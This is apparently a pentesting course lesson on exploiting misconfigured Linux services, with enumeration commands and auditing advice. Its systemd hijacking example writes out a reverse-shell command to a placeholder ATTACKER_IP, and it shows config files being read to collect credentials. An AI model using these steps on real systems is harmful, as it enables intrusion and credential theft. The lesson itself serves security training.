# Day 20 â€“ Linux Services & Daemon Exploitation
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

## ðŸ”¹ Introduction
Services (daemons) are background processes that provide functionality such as web servers, databases, or remote access. Misconfigured services are one of the most common privilege escalation and lateral movement vectors on Linux.

---

## ðŸ”¹ Enumerating Services
Attackers first identify which services are running and how they are configured.

```bash
# List active services
systemctl list-units --type=service

# Check running processes
ps aux | grep root

# List listening ports
netstat -tulnp
ss -tulnp
```

---

## ðŸ”¹ Why Services Matter for Attackers
- Services running as **root** are prime targets.
- Misconfigurations can lead to **remote code execution (RCE)** or **privilege escalation**.
- Configuration files may store **cleartext credentials**.

---

## ðŸ”¹ Common Examples of Service Exploits
- **Apache/NGINX:** If `/var/www/html` is writable, attackers can drop a **webshell**.
- **MySQL:** Default or weak root passwords; credentials stored in `/etc/mysql/my.cnf`.
- **Redis:** Can be exploited to write SSH keys into `/root/.ssh/authorized_keys` â†’ root access.
- **Systemd Services:** Writable unit files can be hijacked to execute attacker code.

```bash
# Example: hijacking a service file
echo -e "[Service]
ExecStart=/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /etc/systemd/system/vulnerable.service
systemctl daemon-reload
systemctl start vulnerable.service
```

---

## ðŸ”¹ Credential Harvesting from Services
Configuration files often contain valuable credentials:

```bash
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
```

Attackers can reuse these credentials for **lateral movement**.

---

## ðŸ”¹ Pentester Notes
When assessing Linux services:
- Look for **services running as root** unnecessarily.
- Check file permissions of service definitions in `/etc/systemd/system/`.
- Audit web/database configs for **hardcoded or weak credentials**.
- Validate that services are not exposed on `0.0.0.0` unless required.

---

## ðŸ“Œ Summary
- Services/daemons are critical attack surfaces.  
- Misconfigured services often lead to privilege escalation.  
- Service files, configs, and running permissions should always be audited.
